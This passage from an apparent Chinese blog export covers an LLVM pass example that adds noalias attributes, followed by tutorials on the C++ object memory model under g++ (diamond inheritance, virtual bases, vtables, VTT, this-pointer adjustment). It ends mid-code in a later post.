class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.c</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span>* x, <span class="keyword">int</span>* y)</span> </span>&#123;</span><br><span class="line">*x = *y + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> *y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编译命令：clang -emit-llvm -S test.c -o test_before_opt.ll</span></span><br><span class="line"><span class="comment">// test_before_opt.ll</span></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i32 @<span class="built_in">foo</span>(i32* noundef %x, i32* noundef %y) #<span class="number">0</span> &#123;</span><br><span class="line">entry:</span><br><span class="line">  %x.addr = alloca i32*, align <span class="number">8</span></span><br><span class="line">  %y.addr = alloca i32*, align <span class="number">8</span></span><br><span class="line">  store i32* %x, i32** %x.addr, align <span class="number">8</span></span><br><span class="line">  store i32* %y, i32** %y.addr, align <span class="number">8</span></span><br><span class="line">  %<span class="number">0</span> = load i32*, i32** %y.addr, align <span class="number">8</span></span><br><span class="line">  %<span class="number">1</span> = load i32, i32* %<span class="number">0</span>, align <span class="number">4</span></span><br><span class="line">  %add = add nsw i32 %<span class="number">1</span>, <span class="number">1</span></span><br><span class="line">  %<span class="number">2</span> = load i32*, i32** %x.addr, align <span class="number">8</span></span><br><span class="line">  store i32 %add, i32* %<span class="number">2</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">3</span> = load i32*, i32** %y.addr, align <span class="number">8</span></span><br><span class="line">  %<span class="number">4</span> = load i32, i32* %<span class="number">3</span>, align <span class="number">4</span></span><br><span class="line">  ret i32 %<span class="number">4</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// opt运行命令：</span></span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i32 @<span class="built_in">foo</span>(i32* noalias noundef %x, i32* noalias noundef %y) #<span class="number">0</span> &#123;</span><br><span class="line">entry:</span><br><span class="line">  %x.addr = alloca i32*, align <span class="number">8</span></span><br><span class="line">  %y.addr = alloca i32*, align <span class="number">8</span></span><br><span class="line">  store i32* %x, i32** %x.addr, align <span class="number">8</span></span><br><span class="line">  store i32* %y, i32** %y.addr, align <span class="number">8</span></span><br><span class="line">  %<span class="number">0</span> = load i32*, i32** %y.addr, align <span class="number">8</span></span><br><span class="line">  %<span class="number">1</span> = load i32, i32* %<span class="number">0</span>, align <span class="number">4</span></span><br><span class="line">  %add = add nsw i32 %<span class="number">1</span>, <span class="number">1</span></span><br><span class="line">  %<span class="number">2</span> = load i32*, i32** %x.addr, align <span class="number">8</span></span><br><span class="line">  store i32 %add, i32* %<span class="number">2</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">3</span> = load i32*, i32** %y.addr, align <span class="number">8</span></span><br><span class="line">  %<span class="number">4</span> = load i32, i32* %<span class="number">3</span>, align <span class="number">4</span></span><br><span class="line">  ret i32 %<span class="number">4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在运行 opt 后，两个指针参数被加上了 <strong>noalias</strong> 属性。</p><blockquote><p>参考文献：<em>LLVM Techniques, Tips, and Best Practices</em>、<a href="https://llvm.org/docs/WritingAnLLVMNewPMPass.html#writing-an-llvm-pass">Writing an LLVM Pass</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> LLVM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LLVM </tag>
            
            <tag> Pass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入理解对象内存模型（二）</title>
      <link href="/2022/03/31/underlyingPrinciple-cpp-class-memory-model-2/"/>
      <url>/2022/03/31/underlyingPrinciple-cpp-class-memory-model-2/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>虚继承是 C++ 类继承体系中的一个重要特性，实现该特性也用了比较复杂的设计，下文通过菱形继承，带虚函数和虚基类的菱形继承，带虚基类的菱形继承来继续分析内存模型。<br>实验环境：</p><ol><li><strong>Ubuntu 21.04</strong></li><li><strong>g++ 10.3.0</strong></li><li><strong>IDA 7.5.0</strong></li><li><strong>[注] 以下程序都是 64 位</strong></li></ol></blockquote><hr><h2 id="菱形继承"><a href="#菱形继承" class="headerlink" title="菱形继承"></a>菱形继承</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span> <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> b;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> :</span> <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> :</span> <span class="keyword">public</span> B, <span class="keyword">public</span> C &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> d;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    D objD; </span><br><span class="line">    <span class="comment">// objD.a = 1;</span></span><br><span class="line">    objD.d = <span class="number">2</span>;</span><br><span class="line">    C *ptrC = &amp;objD; <span class="comment">// this指针修正，相当于 ptrC = static_cast&lt;C *&gt;(&amp;objD)</span></span><br><span class="line">    ptrC-&gt;a = <span class="number">1</span>; </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="1.png"></p><p>如上图所示，在菱形继承中，class D 中会有两个 class A 的子对象，因为 class B 和 class C 都继承了 class A，所以在第 23 行中的代码，在编译的时候会报错，因为这种操作是 ambiguous 的，编译器不知道你指的是 class D 对象中的哪个 a。</p><p>在第 25 行代码中，用 class C 的指针指向 class D 的对象，其行为和多继承几乎一模一样，因为 class C 是 class D 的第二个父基类，所以需要先对 this 指针进行修正，使得其指向 class C 的子对象所在地址。反映在汇编上，就是对 class D 的 this 指针向高地址方向偏移 8 位，如下图所示。</p><p><img src="2.png"></p><hr><h2 id="带虚函数和虚基类的菱形继承"><a href="#带虚函数和虚基类的菱形继承" class="headerlink" title="带虚函数和虚基类的菱形继承"></a>带虚函数和虚基类的菱形继承</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">funcA</span><span class="params">()</span> </span>&#123; a = <span class="number">1</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span> <span class="keyword">virtual</span> <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> b;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">funcB</span><span class="params">()</span> </span>&#123; b = <span class="number">1</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> :</span> <span class="keyword">virtual</span> <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">funcC</span><span class="params">()</span> </span>&#123; c = <span class="number">1</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> :</span> <span class="keyword">public</span> B, <span class="keyword">public</span> C &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">funcD</span><span class="params">()</span> </span>&#123; d = <span class="number">1</span>; &#125;</span><br><span class="line"><span class="keyword">int</span> d;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    D objD;</span><br><span class="line">    D *ptrD = &amp;objD; </span><br><span class="line">    ptrD-&gt;<span class="built_in">funcA</span>(); <span class="comment">// 相当于 dynamic_cast&lt;A *&gt;(&amp;objD)-&gt;funcA()</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如下图所示，在虚继承中，情况就复杂的多了，因为虚继承要保证在对象中只有一个虚基类的实例，所以不能再像上述菱形继承那样来构造内存空间了，那么虚基类 A 的子对象应该放在 class D 对象的什么位置呢？在我们所使用的 GCC 编译器中，采用了如下图所示的内存构造，即<strong>将虚基类的子对象放在了整个内存对象的最下面</strong>。这又引起了一个问题，如何通过子类的指针访问到虚基类的成员呢？我想你已经注意到了在 class D 的虚表中有了一个新的项 ——<font color='red'> <strong>offset vbase，这个表项就是记录在 class D 的对象中各个子对象的 this 指针到虚基类的子对象的偏移。</strong></font>如 class D 的子对象 B，到虚基类 A 的子对象的偏移为 32 个字节；而 class D 的子对象 C，到虚基类 A 的子对象的偏移为 16 个字节；而 class D 的子对象 A，到其自身子对象的偏移为 0 个字节。</p><p><img src="3.png"></p><p>我们可以通过解析上述第 28 行代码来探索这个 <strong>offset vbase</strong> 字段的作用。由于 funcA 是一个虚函数，且其第一次定义在 class A 中，所以通过 ptrD 来调用这个函数的时候，要通过虚表来找到其函数指针，而 funcA 的函数指针保存在 class D 虚表的 class A 子项里面，所以，该行调用首先要通过 offset vbase 将 ptrD 偏移到 class A 的子对象处，即 vptrA 所在的地址，然后才能找到 funcA 的函数指针。通过下图汇编代码所示，可以观察到编译器处理的过程是用到了 offset vbase 的。</p><p><img src="4.png"></p><hr><h2 id="带虚基类的菱形继承"><a href="#带虚基类的菱形继承" class="headerlink" title="带虚基类的菱形继承"></a>带虚基类的菱形继承</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span> <span class="keyword">virtual</span> <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> b;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> :</span> <span class="keyword">virtual</span> <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> :</span> <span class="keyword">public</span> B, <span class="keyword">public</span> C &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> d;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    D objD;</span><br><span class="line">    D *ptrD = &amp;objD;</span><br><span class="line">    ptrD-&gt;a = <span class="number">1</span>; <span class="comment">// 相当于 dynamic_cast&lt;A *&gt;(&amp;objD)-&gt;a = 1;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上块代码中的类继承体系中，class A 是一个虚基类，但是没有任何的虚函数，然而在生成的内存模型中，发现 class D 居然有虚表，如下图 所示，这是为什么呢？这是和上述所说的保存一个虚基类实例的方法同理的，为了在动态的情况下定位到虚基类 A 的子对象，必须把偏移量记录下来，然后保存在虚表中。比如在第 24 行代码中，就会利用 offset vbase 来修正 this 指针，使其可以访问到虚基类 A 的子对象。</p><p><img src="5.png"></p><hr><h2 id="理解带虚基类的对象构造过程"><a href="#理解带虚基类的对象构造过程" class="headerlink" title="理解带虚基类的对象构造过程"></a>理解带虚基类的对象构造过程</h2><p>我们通过第 2 小节中带虚函数和虚基类的菱形继承体系来理解这个过程，在创建一个 class D 的对象时，会调用 D 的构造函数，而 D 的构造函数又会依次调用 A，B，C 的构造函数，我们逐步分析。</p><p>第一步肯定是调用 A 的构造函数，初始化子对象 A 的内存空间，这个过程很简单，令 vptrA 指向 class A 的虚表即可。调用 class A 的构造函数后 objD 对象的内存模型如下图所示。</p><p><img src="6.png"></p><p>第二步将调用 B 的构造函数，但是 B 的构造函数并不是简单的令 B 的子对象中的 vptrB 指向了 B 的虚表，而是使得 vptrB 指向了一个称为 <strong>B-IN-D</strong> 虚表，同时调整了 vptrA 指针，指向 B-IN-D 虚表中的 A 子项，如下图所示。这里就有问题出来了，<font color='red'><strong>为什么 B 的构造函数就知道要让 vptrB 指向 B-IN-D 这个虚表呢？这个虚表是哪里来的呢？</strong></font>其实对于继承了类 B 的其他类 X，编译器都会为其生成 B-IN-X 这种虚表，在类 X 调用 B 的构造函数时，除了传入 this 指针，还会传入一个指向 B-IN-X 虚表的指针，而这种指针都保存在了类 X 的 <strong>virtual table table（VTT）</strong> 中（同样在编译时生成），然后 B 的构造函数会通过这个指针初始化 B 的虚表指针，同时调整虚基类 A 的虚表指针。</p><p><img src="7.png"></p><p>第三步将调用 C 的构造函数，有了第二步的铺垫，第三步自然就简单多了，其原理和第二步完全一样。通过传入 C 的构造函数 this 指针和 C-IN-D 虚表指针来对类 C 的子对象进行初始化，初始化的结果如下图所示。</p><p><img src="8.png"></p><p>第四步就是回到 D 的构造函数，重新为 class D 中的各个 vptr 赋值，使其指向 D 的虚表中的指定位置。最后在 D 的构造函数运行完成后，得到 D 的对象的内存模型如第三节中所示。</p><p>对于 D 的 VTT 的结构，其中保存了一系列的虚表指针，这些指针指向 B-IN-D 虚表， C-IN-D 虚表，D 虚表的指定位置，用于协助类 B、C、D 来执行构造函数。如下图所示。</p><p><img src="9.png"></p><blockquote><p>C++ 中对象的内存模型是十分复杂的，但是归根结底无非就是用到了<strong>虚表（vtable）</strong>，<strong>虚表指针（vptr）</strong>，<strong>虚表表（VTT）</strong>，<strong>this 指针修正</strong>这几种技术，上述对内存模型的探索都涵盖到了这几个概念，对于不同的类继承体系，用上述几种技术都可以实现其内存构造~ </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 底层原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> 面向对象 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入理解对象内存模型（一）</title>
      <link href="/2022/03/31/underlyingPrinciple-cpp-class-memory-model-1/"/>
      <url>/2022/03/31/underlyingPrinciple-cpp-class-memory-model-1/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>理解 C++ 面向对象的实现机制是理解这个语言很重要的一环，可以用于举一反三，本文分别从单继承，带虚函数的单继承，多继承，带虚函数的多继承来分析 C++ 中的对象内存模型。<br>实验环境：</p><ol><li><strong>Ubuntu 21.04</strong></li><li><strong>g++ 10.3.0</strong></li><li><strong>IDA 7.5.0</strong></li><li><strong>[注] 以下程序都是 64 位</strong></li></ol></blockquote><hr><h2 id="单继承"><a href="#单继承" class="headerlink" title="单继承"></a>单继承</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span> <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> b;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    B objB; objB.a = <span class="number">1</span>; objB.b = <span class="number">2</span>;</span><br><span class="line">    A objA = objB; <span class="comment">// 相当于 objA.a = objB.a</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于上述代码中定义的类 A 和类 B，内存模型是很简单的。如下图所示，类 B 由于继承自类 A，所以类 B 的对象中相当于有了一个 A 的子对象，这样使得语言支持上述代码中 13 行的那种隐式转换。如果从内存操作的角度看，上述的第 13 行代码仅仅是将对象 objB 的前四个字节拷贝到对象 objA 所在的内存空间中，相当于将对象 objB 截断，并将其中类 A 子对象拷贝给 objA。</p><p><img src="1.png"></p><hr><h2 id="带虚函数的单继承"><a href="#带虚函数的单继承" class="headerlink" title="带虚函数的单继承"></a>带虚函数的单继承</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">func</span><span class="params">()</span> </span>&#123; a = <span class="number">1</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span> <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> b;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123; b = <span class="number">1</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    B objB;</span><br><span class="line">    A *ptrA = &amp;objB;</span><br><span class="line">    ptrA-&gt;<span class="built_in">func</span>();    <span class="comment">// 相当于 (*(ptrA-&gt;vptr[0]))(ptrA)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上述代码中，类 B 继承自类 A，同时类 B 也重写了虚函数 func。由于需要支持多态，也就是延迟绑定，也就是通过基类 A 的指针调用子类 B 中的函数 func，g++ 编译器给带虚函数的类生成了一个<strong>虚表（vtable）</strong>，用来保存对应的类中虚函数的地址，同时在类对象中生成一个<strong>虚表指针（vptr），</strong>用来指向虚表中第一个虚函数表项所在的地址。下图则表示了一个类 B 对象的内存模型，其首 8 个字节是虚表指针，指向类 B 的虚表中第一个虚函数 B::func 表项，该表项就存储着虚函数 B::func 的实际地址。这样上述代码中第 16 行中对 func 函数的调用则被编译器翻译为其后所注释的代码。至于下图中类 B 的虚表有两个表项 <strong>offset to this</strong> 和 <strong>typeinfo for B</strong> 在后续再进行了解。</p><p><img src="2.png"></p><blockquote><p><strong>虚表指针和虚表这一套东西是怎么样正常运转起来实现多态机制的呢？</strong></p><p>​         首先编译器在<strong>编译阶段</strong>就会为每个有虚函数的类对应生成一个虚表，虚表中保存着虚函数的地址。然后在<strong>运行阶段</strong>，创建一个类的对象时会调用构造函数，构造函数则会根据对象的类型初始化其虚表指针，使得虚表指针指向该类的虚表，这样便可以实现多态机制了。</p><p>​         当通过一个指针调用虚函数的时候，首先通过对象所在内存的第一个单元（即虚表指针）找到虚表，然后根据该虚函数对应的偏移（这个偏移是在编译的时候就能确定的）找到虚表中对应表项，该表项则是需要调用的函数地址。<strong>这样具体调用的是哪个虚函数，则完全由虚表指针决定了，而虚表指针又是在对象被创建的时候被初始化的，其对应到了动态运行时对象的类型，从而调用的虚函数取决于对象的实际类型，以此实现了多态机制。</strong></p></blockquote><hr><h2 id="多继承"><a href="#多继承" class="headerlink" title="多继承"></a>多继承</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> b;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> :</span> <span class="keyword">public</span> A, <span class="keyword">public</span> B &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    C objC;</span><br><span class="line">    B *ptrB = &amp;objC; <span class="comment">// 相当于 ptrB = &amp;objC + sizeof(A);</span></span><br><span class="line">    ptrB-&gt;b = <span class="number">1</span>; </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于不带虚函数的多继承模型，看起来似乎是十分简单的，不过是把类 A 和类 B 的子对象依次排列下来而已，但是<strong>你有没有思考过为什么要把类 A 的对象放在类 B 对象的前面呢</strong>？其实 C++ 标准并没有对同样是基类的 A 和 B 的子对象在子类 C 中的先后顺序作出规定，而将其实现的细节留给了编译器设计者。</p><p>在我使用的 GCC 编译器中，其实现就如下图所示。这一切看起来好像都很和谐，但是又有一个问题了，在上述的第 19 行代码中，由于 ptrB 的静态类型是 B * ，所以编译器在生成代码的时候，会将常量 1 直接赋值到 ptrB 所指向内存的第一个 4 字节单元内；而在 18 行代码中，取 objC 对象的地址来对  prtB 进行初始化，如果直接将 objC 的地址赋值给 ptrB，那么 ptrB 指向的空间并不是 B’s subobject，那么 19 的赋值语句并没有预想的结果。那么编译器是怎么保证这种继承模型下，代码生成的正确性呢？其实也很简单，在 18 行进行 this <strong>指针修正</strong>即可，即加上一个偏移量 sizeof(A)，如上述代码 18 行注释所示！</p><p><img src="3.png"></p><blockquote><p>从子类指针到基类指针的转换本身就是一种隐式转换，编译器并不是在任何情况下都会允许这种转换（将上述的 public 继承换成 private 继承试试？）。所以编译器在处理上述第 18 行代码的时候，首先会判定从 C* 类型到 B* 类型的转换是否是允许的，如果不允许则报编译错误；如果允许，则根据类继承结构进行 <strong>this 指针修正</strong>，<strong>将基类在子类中的子对象的真正地址赋值给目的指针，而不是简单的将子类对象的地址赋值给目的指针</strong>。</p></blockquote><hr><h2 id="带虚函数的多继承"><a href="#带虚函数的多继承" class="headerlink" title="带虚函数的多继承"></a>带虚函数的多继承</h2><p>前三种情况看起来还是比较简单明了，而带虚函数的多继承则会稍微复杂了，我们通过两段不同的代码来探索在该种情况下的内存布局。<strong>所以，在进入本节之前，请确保你已经完全理解了上述的内容！</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">funcA</span><span class="params">()</span> </span>&#123; a = <span class="number">1</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> b;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">funcB</span><span class="params">()</span> </span>&#123; b = <span class="number">1</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> :</span> <span class="keyword">public</span> A, <span class="keyword">public</span> B &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// void funcB() override &#123; c = 1; &#125;</span></span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    C objC;</span><br><span class="line">    A *ptrA = &amp;objC; ptrA-&gt;<span class="built_in">funcA</span>();</span><br><span class="line">    B *ptrB = &amp;objC; ptrB-&gt;<span class="built_in">funcB</span>();</span><br><span class="line">    C *ptrC = &amp;objC; ptrC-&gt;<span class="built_in">funcB</span>(); <span class="comment">// 相当于 static_cast&lt;B*&gt;(ptrC)-&gt;funcB()</span></span><br><span class="line">    <span 